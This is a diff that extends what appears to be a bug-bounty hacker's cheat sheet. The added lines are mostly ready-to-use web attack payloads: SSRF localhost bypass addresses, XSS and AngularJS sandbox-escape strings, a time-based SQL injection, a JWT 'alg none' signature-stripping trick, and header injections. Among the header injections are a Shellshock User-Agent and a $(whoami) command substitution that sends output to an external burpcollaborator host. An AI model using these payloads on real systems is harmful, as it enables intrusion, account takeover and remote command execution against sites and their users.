@@ -287,6 +287,18 @@ Bypass Method 1:
 Bypass Method 2:
 /api\\users -> 200 OK
 to pypass host unauthorized >> Host: localhost
+example.com
+SHORT-HAND IP
+http://0/Admin/
+http://127.1/AdMiN
+http://127.0.1/aDMIn
+LOCALHOST WITH A
+DOMAIN REDIRECTION
+http://spoofed.burpcollaborator.net
+http://localtest.me
+127.0.0.1.nip.io
+STORY OF [::]
+http://[::]:22/ SSH
 
 ------------------------------------------------------------------------------------------------------
 WAF Bypass 
@@ -394,9 +406,14 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 10-     {"description":"<script>alert(\"hossam\")"}
 	{"description":"<script>alert(\"hossam\");</script>"}
 
+11- or you can inject >> <scrip> data{"name"-alert(1)-"hossam"}</script> that is if only script tag appeared not only in json	( source code )
 
+12- ["');alert('XSS');//"]@xyz.xxx	json pypass
 
-
+13- BLOCKED: "><a href=javascript:alert(1)>accept</a>
+	-ALLOWED: xyz"/ng-click="constructor.constructor('alert(1)')()
+	-Payload:  <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>  
+	-Payload: %7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
 
 -----------------------------------------------------------------------------------------------------------------------------------------------
 Signup
@@ -817,7 +834,7 @@ SQLI
 
 9- can inject json with sleep >> "username":"hsosamshady;sleep(111)"
 
-
+10- Parameter=randomtext%' OR SLEEP (5) #
 
 
 
@@ -948,8 +965,21 @@ Httpx
 -------------------------------------------------------------------------------------------------------
 Burpsuite
 1-search for =>  Request.Query CONTAINS "=https"	==> for open redirect 
+2- Using Autorize 
+3- 
 
---------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------
+JWT
+1- change user role or id in jwt 
+2- change user role and alg to "none" and remove signature and leave . after payload
+3- 
+
+
+
+
+
+
+--------------------------------------------------------------------------------------------------
 Cors misconfigratoin
 1- get all subdomains
 	- cat httpx.txt | parallel -j 10 curl --proxy "http://127.0.0.1:8080" -sk 2>/dev/null
@@ -1062,6 +1092,10 @@ headers injection with param miner
 host: victim.com
 host: @hacker.com
  host: hacker.com
+X-Forwarded-For: id.burplink.net:8080/aditya.php
+X-Forwarded-For: http://user:pass@hostname/
+User-Agent:() { :; }; /usr/bin/nslookup
+$(whoami).id.burpcollaborator.net
 	
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 IDOR
